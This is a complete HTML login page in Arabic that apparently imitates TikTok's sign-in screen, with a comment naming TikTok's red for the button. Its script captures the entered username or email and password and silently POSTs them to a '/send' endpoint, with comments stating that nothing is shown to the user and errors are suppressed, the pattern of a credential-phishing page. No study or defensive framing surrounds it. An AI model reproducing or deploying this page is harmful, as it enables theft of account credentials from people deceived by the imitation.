<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>تسجيل الدخول</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #fff;
      direction: rtl;
    }

    .container {
      max-width: 400px;
      margin: 50px auto;
      padding: 20px;
      position: relative;
    }

    .help-icon {
      font-size: 23px;
      color: #000000;
      cursor: pointer;
      position: absolute;
      top: 2px;
      left: 15px;
      width: 24px;
      height: 24px;
      text-align: center;
      line-height: 24px;
      border-radius: 50%;
      border: 1px solid #000000;
    }

    h1 {
      text-align: center;
      font-size: 24px;
      margin-bottom: 30px;
    }

    .input-group {
      margin-bottom: 20px;
      position: relative;
    }

    .input-group input {
      width: 100%;
      border: none;
      border-bottom: 1px solid #ccc;
      padding: 12px 0;
      font-size: 16px;
      outline: none;
      transition: border-color 0.3s;
    }

    .input-group input:focus {
      border-bottom: 2px solid #888;
    }

    .forgot {
      text-align: right;
      color: #333;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
      margin-bottom: 30px;
    }

    .login-btn {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      background-color: #ccc;
      color: #fff;
      cursor: not-allowed;
      transition: background-color 0.3s;
    }

    .login-btn.active {
      background-color: #fe2c55; /* أحمر تيك توك */
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="help-icon">؟</div>
    <h1>تسجيل الدخول</h1>

    <div class="input-group">
      <input type="text" id="email" placeholder="البريد الإلكتروني أو اسم المستخدم" autocomplete="username" />
    </div>
    <div class="input-group">
      <input type="password" id="password" placeholder="كلمة المرور" autocomplete="current-password" />
    </div>

    <div class="forgot">نسيت كلمة السر؟</div>

    <button id="loginBtn" class="login-btn">تسجيل الدخول</button>
  </div>

  <script>
    const email = document.getElementById('email');
    const password = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');

    function toggleButton() {
      if (email.value.trim() !== '' && password.value.trim() !== '') {
        loginBtn.classList.add('active');
        loginBtn.disabled = false;
      } else {
        loginBtn.classList.remove('active');
        loginBtn.disabled = true;
      }
    }

    // تفعيل/تعطيل الزر عند الكتابة
    email.addEventListener('input', toggleButton);
    password.addEventListener('input', toggleButton);

    // عند الضغط على الزر، نرسل POST إلى /send بدون إظهار أي رسالة
    loginBtn.addEventListener('click', async () => {
      if (!loginBtn.classList.contains('active')) return;

      const payload = {
        email: email.value.trim(),
        password: password.value.trim()
      };

      try {
        await fetch('/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch (e) {
        // لا نعرض أي شيء للمستخدم
      }
    });

    // تهيئة الزر مُعطّل عند البدء
    toggleButton();
  </script>
</body>
</html>
